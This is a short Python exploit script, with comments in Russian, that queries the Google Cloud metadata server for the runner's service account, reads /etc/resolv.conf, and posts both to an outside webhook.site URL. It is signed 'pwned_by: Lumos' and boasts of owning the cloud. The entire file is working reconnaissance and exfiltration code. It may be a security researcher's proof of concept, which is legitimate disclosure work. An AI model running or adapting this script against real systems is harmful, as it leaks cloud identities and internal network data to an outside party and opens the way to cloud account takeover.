import subprocess
import json

WEBHOOK_URL = "https://webhook.site/6d6434ac-bcd7-48a4-901c-53ca63be0ec2"

def exploit_metadata():
    # Попытка достучаться до GCP Metadata Server (классика для Lateral Movement)
    # Заголовок 'Metadata-Flavor: Google' обязателен для GCP
    cmd = [
        'curl', '-s', '-H', 'Metadata-Flavor: Google',
        'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email'
    ]
    
    try:
        service_account = subprocess.check_output(cmd, timeout=5).decode().strip()
    except:
        service_account = "ACCESS_DENIED_OR_TIMEOUT"

    # Проверка на наличие открытых портов в стандартной сети Kubernetes/Docker
    # Мы попробуем найти DNS-сервер или API-сервер
    report = {
        "CRITICAL_EXPOSURE": "CLOUD_SERVICE_ACCOUNT_LEAK",
        "service_account": service_account,
        "internal_dns_info": open("/etc/resolv.conf").read(),
        "status": "I can identify the IAM identity of this runner. If I get the token, I own your cloud.",
        "pwned_by": "Lumos"
    }

    subprocess.run([
        'curl', '-s', '-X', 'POST', 
        '-H', 'Content-Type: application/json',
        '-d', json.dumps(report), 
        WEBHOOK_URL
    ])

if __name__ == "__main__":
    exploit_metadata()
